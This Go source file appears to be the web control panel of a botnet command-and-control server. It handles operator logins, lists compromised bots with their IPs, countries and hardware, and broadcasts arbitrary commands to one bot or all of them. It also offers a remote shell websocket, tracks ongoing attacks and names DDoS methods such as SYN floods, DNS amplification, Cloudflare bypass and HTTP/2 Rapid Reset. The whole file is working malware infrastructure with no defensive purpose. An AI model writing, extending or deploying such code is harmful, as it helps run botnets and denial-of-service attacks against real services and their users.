package main

import (
	"crypto/rand"
	"embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// ============================================================================
// WEB PANEL SERVER
// Username/password login via users.json — same credentials as telnet.
// ============================================================================

//go:embed web/login.html web/dashboard.html web/style.css web/app.js
var webFS embed.FS

var (
	webSessions     = make(map[string]*WebSession)
	webSessionsLock sync.RWMutex

	// Activity log — ring buffer of recent events for the web panel
	activityLog     []ActivityLogEntry
	activityLogLock sync.RWMutex

	// Stats history for sparkline charts (sampled every 10s, keep last 30 points = 5 min)
	statsHistory     []StatsSnapshot
	statsHistoryLock sync.RWMutex

	// SSE clients
	sseClients     = make(map[chan SSEEvent]bool)
	sseClientsLock sync.RWMutex

	// Login rate limiting — track failed attempts per IP
	loginAttempts     = make(map[string][]time.Time)
	loginAttemptsLock sync.Mutex

	// Bot group assignments
	botGroups     = make(map[string]string)
	botGroupsLock sync.RWMutex
)

type WebSession struct {
	Username  string
	Level     string
	CreatedAt time.Time
	ExpiresAt time.Time
}

type ActivityLogEntry struct {
	Timestamp string `json:"timestamp"`
	Type      string `json:"type"`
	Message   string `json:"message"`
}

type StatsSnapshot struct {
	Time     string `json:"time"`
	BotCount int    `json:"botCount"`
}

type SSEEvent struct {
	Event string
	Data  string
}

// PushActivity adds an entry to the activity log (ring buffer, max 200)
func PushActivity(eventType, message string) {
	entry := ActivityLogEntry{
		Timestamp: time.Now().Format(time.RFC3339),
		Type:      eventType,
		Message:   message,
	}
	activityLogLock.Lock()
	activityLog = append(activityLog, entry)
	if len(activityLog) > 200 {
		activityLog = activityLog[len(activityLog)-200:]
	}
	activityLogLock.Unlock()

	broadcastSSE(SSEEvent{Event: "activity", Data: message})
}

func broadcastSSE(event SSEEvent) {
	sseClientsLock.RLock()
	defer sseClientsLock.RUnlock()
	for ch := range sseClients {
		select {
		case ch <- event:
		default:
		}
	}
}

func generateSessionID() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

func getWebSession(r *http.Request) *WebSession {
	cookie, err := r.Cookie("vps")
	if err != nil {
		return nil
	}
	webSessionsLock.RLock()
	defer webSessionsLock.RUnlock()
	sess, ok := webSessions[cookie.Value]
	if !ok || time.Now().After(sess.ExpiresAt) {
		return nil
	}
	return sess
}

func requireWebAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if getWebSession(r) == nil {
			if strings.HasPrefix(r.URL.Path, "/api/") || strings.HasPrefix(r.URL.Path, "/ws/") {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusUnauthorized)
				w.Write([]byte(`{"error":"unauthorized"}`))
				return
			}
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}
		next(w, r)
	}
}

func cleanupExpiredSessions() {
	for {
		time.Sleep(10 * time.Minute)
		webSessionsLock.Lock()
		now := time.Now()
		for id, sess := range webSessions {
			if now.After(sess.ExpiresAt) {
				delete(webSessions, id)
			}
		}
		webSessionsLock.Unlock()
	}
}

func sampleStats() {
	for {
		time.Sleep(10 * time.Second)
		snap := StatsSnapshot{
			Time:     time.Now().Format("15:04:05"),
			BotCount: getBotCount(),
		}
		statsHistoryLock.Lock()
		statsHistory = append(statsHistory, snap)
		if len(statsHistory) > 30 {
			statsHistory = statsHistory[len(statsHistory)-30:]
		}
		statsHistoryLock.Unlock()
	}
}

// NewWebMux creates and returns the HTTP handler for the web panel.
func NewWebMux() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/login", handleWebLogin)
	mux.HandleFunc("/logout", handleWebLogout)
	mux.HandleFunc("/api/bots", requireWebAuth(handleAPIBots))
	mux.HandleFunc("/api/stats", requireWebAuth(handleAPIStats))
	mux.HandleFunc("/api/command", requireWebAuth(handleAPICommand))
	mux.HandleFunc("/api/activity", requireWebAuth(handleAPIActivity))
	mux.HandleFunc("/api/groups", requireWebAuth(handleAPIGroups))
	mux.HandleFunc("/api/group", requireWebAuth(handleAPISetGroup))
	mux.HandleFunc("/api/attack-methods", requireWebAuth(handleAPIAttackMethods))
	mux.HandleFunc("/api/attacks", requireWebAuth(handleAPIRunningAttacks))
	mux.HandleFunc("/api/events", requireWebAuth(handleSSE))
	mux.HandleFunc("/api/users", requireWebAuth(handleAPIUsers))
	mux.HandleFunc("/api/relays", requireWebAuth(handleAPIRelays))
	mux.HandleFunc("/api/relay-api", requireWebAuth(handleAPIRelayAPI))
	mux.HandleFunc("/api/relay-stats", requireWebAuth(handleAPIRelayStats))
	mux.HandleFunc("/api/tasks", requireWebAuth(handleAPITasks))
	mux.HandleFunc("/static/style.css", handleStaticCSS)
	mux.HandleFunc("/static/app.js", handleStaticJS)
	mux.HandleFunc("/ws/shell", requireWebAuth(handleWebShellWS))
	mux.HandleFunc("/", requireWebAuth(handleDashboard))

	return securityHeaders(mux)
}

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}

// ============================================================================
// STATIC FILE HANDLERS
// ============================================================================

func handleStaticCSS(w http.ResponseWriter, r *http.Request) {
	data, err := webFS.ReadFile("web/style.css")
	if err != nil {
		http.Error(w, "Not found", 404)
		return
	}
	w.Header().Set("Content-Type", "text/css; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write(data)
}

func handleStaticJS(w http.ResponseWriter, r *http.Request) {
	data, err := webFS.ReadFile("web/app.js")
	if err != nil {
		http.Error(w, "Not found", 404)
		return
	}
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write(data)
}

// ============================================================================
// HTTP HANDLERS
// ============================================================================

func handleWebLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		if getWebSession(r) != nil {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		data, _ := webFS.ReadFile("web/login.html")
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(data)
		return
	}

	if r.Method == "POST" {
		if ct := r.Header.Get("Content-Type"); !strings.HasPrefix(ct, "application/json") {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}

		// Rate limit: max 5 failed attempts per IP per minute
		ip := r.RemoteAddr
		if idx := strings.LastIndex(ip, ":"); idx != -1 {
			ip = ip[:idx]
		}
		loginAttemptsLock.Lock()
		now := time.Now()
		cutoff := now.Add(-1 * time.Minute)
		var recent []time.Time
		for _, t := range loginAttempts[ip] {
			if t.After(cutoff) {
				recent = append(recent, t)
			}
		}
		loginAttempts[ip] = recent
		if len(recent) >= 5 {
			loginAttemptsLock.Unlock()
			writeJSON(w, http.StatusTooManyRequests, map[string]interface{}{"success": false, "error": "Too many attempts, try again later"})
			return
		}
		loginAttemptsLock.Unlock()

		var body struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Bad request"})
			return
		}

		username := strings.TrimSpace(body.Username)
		password := strings.TrimSpace(body.Password)

		ok, user := AuthUser(username, password)
		if !ok || user == nil {
			loginAttemptsLock.Lock()
			loginAttempts[ip] = append(loginAttempts[ip], now)
			loginAttemptsLock.Unlock()
			writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "Invalid credentials"})
			return
		}

		sessID := generateSessionID()
		webSessionsLock.Lock()
		webSessions[sessID] = &WebSession{
			Username:  user.Username,
			Level:     user.Level,
			CreatedAt: time.Now(),
			ExpiresAt: time.Now().Add(24 * time.Hour),
		}
		webSessionsLock.Unlock()

		http.SetCookie(w, &http.Cookie{
			Name:     "vps",
			Value:    sessID,
			Path:     "/",
			HttpOnly: true,
			MaxAge:   86400,
			SameSite: http.SameSiteLaxMode,
		})

		PushActivity("login", fmt.Sprintf("%s logged in via web panel", username))
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})
		return
	}

	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

func handleWebLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("vps")
	if err == nil {
		webSessionsLock.Lock()
		delete(webSessions, cookie.Value)
		webSessionsLock.Unlock()
	}
	http.SetCookie(w, &http.Cookie{
		Name:   "vps",
		Value:  "",
		Path:   "/",
		MaxAge: -1,
	})
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	data, _ := webFS.ReadFile("web/dashboard.html")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(data)
}

// ============================================================================
// API HANDLERS
// ============================================================================

type apiBotEntry struct {
	BotID       string  `json:"botID"`
	Arch        string  `json:"arch"`
	IP          string  `json:"ip"`
	RAM         int64   `json:"ram"`
	CPUCores    int     `json:"cpuCores"`
	ProcessName string  `json:"processName"`
	Country     string  `json:"country"`
	Group       string  `json:"group"`
	ConnectedAt string  `json:"connectedAt"`
	LastPing    string  `json:"lastPing"`
	Uptime      string  `json:"uptime"`
}

func handleAPIBots(w http.ResponseWriter, r *http.Request) {
	botConnsLock.RLock()
	bots := make([]apiBotEntry, 0, len(botConnections))
	for _, bc := range botConnections {
		if bc.authenticated {
			botGroupsLock.RLock()
			group := botGroups[bc.botID]
			botGroupsLock.RUnlock()
			bots = append(bots, apiBotEntry{
				BotID:       bc.botID,
				Arch:        bc.arch,
				IP:          bc.ip,
				RAM:         bc.ram,
				CPUCores:    bc.cpuCores,
				ProcessName: bc.processName,
				Country:     bc.country,
				Group:       group,
				ConnectedAt: bc.connectedAt.Format(time.RFC3339),
				LastPing:    bc.lastPing.Format(time.RFC3339),
				Uptime:      formatDuration(time.Since(bc.connectedAt)),
			})
		}
	}
	botConnsLock.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(bots)
}

type apiStatsResponse struct {
	BotCount int            `json:"botCount"`
	TotalRAM int64          `json:"totalRAM"`
	TotalCPU int            `json:"totalCPU"`
	Uptime   string         `json:"uptime"`
	ArchMap  map[string]int `json:"archMap"`
	History  []StatsSnapshot `json:"history"`
}

func handleAPIStats(w http.ResponseWriter, r *http.Request) {
	statsHistoryLock.RLock()
	hist := make([]StatsSnapshot, len(statsHistory))
	copy(hist, statsHistory)
	statsHistoryLock.RUnlock()

	stats := apiStatsResponse{
		BotCount: getBotCount(),
		TotalRAM: getTotalRAM(),
		TotalCPU: getTotalCPU(),
		Uptime:   getC2Uptime(),
		ArchMap:  getArchMap(),
		History:  hist,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(stats)
}

func handleAPICommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Command string `json:"command"`
		BotID   string `json:"botID"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "message": "Invalid JSON"})
		return
	}

	cmd := strings.TrimSpace(req.Command)
	if cmd == "" {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "message": "Empty command"})
		return
	}

	if req.BotID != "" {
		ok := sendToSingleBot(req.BotID, cmd)
		if ok {
			PushActivity("command", fmt.Sprintf("-> %s: %s", req.BotID, cmd))
			writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": fmt.Sprintf("Sent to bot %s", req.BotID)})
		} else {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "message": "Bot not found"})
		}
	} else {
		sendToBots(cmd)
		count := getBotCount()
		PushActivity("command", fmt.Sprintf("broadcast -> %d bots: %s", count, cmd))
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": fmt.Sprintf("Sent to %d bots", count)})
	}
}

func handleAPIActivity(w http.ResponseWriter, r *http.Request) {
	activityLogLock.RLock()
	entries := make([]ActivityLogEntry, len(activityLog))
	copy(entries, activityLog)
	activityLogLock.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(entries)
}

func handleAPIGroups(w http.ResponseWriter, r *http.Request) {
	botGroupsLock.RLock()
	groups := make(map[string]bool)
	for _, g := range botGroups {
		if g != "" {
			groups[g] = true
		}
	}
	botGroupsLock.RUnlock()
	result := make([]string, 0, len(groups))
	for g := range groups {
		result = append(result, g)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

func handleAPISetGroup(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		BotIDs []string `json:"botIDs"`
		Group  string   `json:"group"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
		return
	}
	botGroupsLock.Lock()
	for _, id := range req.BotIDs {
		if req.Group == "" {
			delete(botGroups, id)
		} else {
			botGroups[id] = req.Group
		}
	}
	botGroupsLock.Unlock()
	writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})
}

func handleAPIAttackMethods(w http.ResponseWriter, r *http.Request) {
	methods := []map[string]string{
		{"name": "udpflood", "description": "UDP volume flood", "layer": "4"},
		{"name": "tcpflood", "description": "TCP connection flood", "layer": "4"},
		{"name": "syn", "description": "SYN packet flood", "layer": "4"},
		{"name": "ack", "description": "ACK packet flood", "layer": "4"},
		{"name": "gre", "description": "GRE tunnel flood", "layer": "4"},
		{"name": "dns", "description": "DNS amplification", "layer": "4"},
		{"name": "http", "description": "HTTP GET/POST flood", "layer": "7"},
		{"name": "https", "description": "HTTPS/TLS flood", "layer": "7"},
		{"name": "cfbypass", "description": "Cloudflare bypass", "layer": "7"},
		{"name": "rapidreset", "description": "HTTP/2 Rapid Reset", "layer": "7"},
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(methods)
}

func handleAPIRunningAttacks(w http.ResponseWriter, r *http.Request) {
	ongoingAttacksLock.RLock()
	attacks := make([]map[string]interface{}, 0)
	for _, atk := range ongoingAttacks {
		remaining := atk.duration - time.Since(atk.start)
		if remaining < 0 {
			continue
		}
		attacks = append(attacks, map[string]interface{}{
			"method":    atk.method,
			"target":    atk.ip,
			"port":      atk.port,
			"remaining": int(remaining.Seconds()),
		})
	}
	ongoingAttacksLock.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(attacks)
}

func handleSSE(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming not supported", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	ch := make(chan SSEEvent, 32)
	sseClientsLock.Lock()
	sseClients[ch] = true
	sseClientsLock.Unlock()
	defer func() {
		sseClientsLock.Lock()
		delete(sseClients, ch)
		sseClientsLock.Unlock()
	}()

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case event := <-ch:
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", event.Event, event.Data)
			flusher.Flush()
		}
	}
}


// ============================================================================
// USERS / RELAYS / TASKS API (stub endpoints for dashboard)
// ============================================================================

func handleAPIUsers(w http.ResponseWriter, r *http.Request) {
	usersData, err := os.ReadFile(usersFile)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, []interface{}{})
		return
	}
	var users []User
	if err := json.Unmarshal(usersData, &users); err != nil {
		writeJSON(w, http.StatusInternalServerError, []interface{}{})
		return
	}
	type safeUser struct {
		Username string `json:"username"`
		Level    string `json:"level"`
		Expire   string `json:"expire"`
	}
	safe := make([]safeUser, len(users))
	for i, u := range users {
		safe[i] = safeUser{Username: u.Username, Level: u.Level, Expire: u.Expire.Format(time.RFC3339)}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(safe)
}

func handleAPIRelays(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("[]"))
}

func handleAPIRelayAPI(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{"running": false, "port": ""})
}

func handleAPIRelayStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("{}"))
}

func handleAPITasks(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("[]"))
}
